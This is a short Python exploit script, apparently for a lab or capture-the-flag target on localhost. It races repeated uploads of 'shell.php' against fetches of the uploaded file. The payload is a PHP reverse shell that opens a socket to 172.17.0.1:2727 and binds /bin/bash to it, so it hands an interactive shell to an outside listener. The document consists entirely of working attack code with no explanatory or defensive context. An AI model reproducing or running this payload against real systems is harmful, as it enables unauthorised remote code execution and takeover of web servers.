import requests, threading, time

upload_url = "http://localhost:9003/upload.php"
fetch_url = "http://localhost:9003/uploads/shell.php"
payload = '''<?php
$sock=fsockopen("172.17.0.1",2727);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'''
found = False

def getter():
    global found
    while True and not found:
        r = requests.get(fetch_url)
        if r.status_code == 200:
            print(r.text);
            found = True
            break

def uploader():
    requests.post(upload_url, files={"file":("shell.php", payload)})

for _ in range(5):
    t = threading.Thread(target=getter)
    u = threading.Thread(target=uploader)
    t.start()
    u.start()

